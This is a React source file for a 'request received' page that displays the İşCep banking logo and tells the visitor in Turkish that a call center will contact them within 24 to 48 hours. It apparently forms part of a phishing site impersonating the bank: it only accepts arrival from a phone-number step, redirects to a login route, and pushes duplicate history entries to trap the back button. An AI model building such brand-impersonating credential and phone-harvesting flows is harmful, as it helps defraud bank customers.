import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext';

function WaitingPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth();
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  useEffect(() => {
    const isValidNavigation = location.state?.isValidNavigation && location.state?.from === '/telefon';
    const isCompleted = location.state?.isCompleted;

    if (!isValidNavigation) {
      authDispatch({ type: 'RESET_AUTH' }); // Geçersiz navigasyonda state'i sıfırla
      if (isMobile) {
        setIsLoading(true);
        setTimeout(() => {
          window.history.replaceState(null, '', '/giris');
          navigate('/giris', { replace: true, state: { fromWaitingPage: true } });
        }, 1500);
      } else {
        window.history.replaceState(null, '', '/giris');
        navigate('/giris', { replace: true, state: { fromWaitingPage: true } });
      }
    } else if (isCompleted) {
      setIsLoading(false);

      const handlePopState = () => {
        authDispatch({ type: 'RESET_AUTH' }); // Geri tuşunda state'i sıfırla
        window.history.replaceState(null, '', '/giris');
        navigate('/giris', { replace: true, state: { fromWaitingPage: true } });
      };

      window.history.pushState(null, '', '/giris');
      window.history.pushState(null, '', '/giris');

      window.addEventListener('popstate', handlePopState);
      return () => window.removeEventListener('popstate', handlePopState);
    }
  }, [location.state, navigate, isMobile, authDispatch]);

  if (isLoading && isMobile) {
    return (
      <div className="waiting-overlay">
        <div className="waiting-container">
          <img src="/check.png" alt="Check Logo" className="waiting-logo" />
          <p className="waiting-text">Lütfen Bekleyin</p>
        </div>
      </div>
    );
  }

  return (
    <div className="container">
      <div className="bekleme-content">
        <img src="/iscep-logo.png" alt="İşCep Logo" className="bekleme-iscep-logo" />
        <img src="/check.png" alt="Check Logo" className="bekleme-check-logo" />
        <p className="waiting-message">
          Talebiniz başarıyla alındı.
          Çağrı Merkezimiz sizinle 24 ila 48 saat
          içinde iletişime geçecektir.
        </p>
      </div>
    </div>
  );
}

export default WaitingPage;
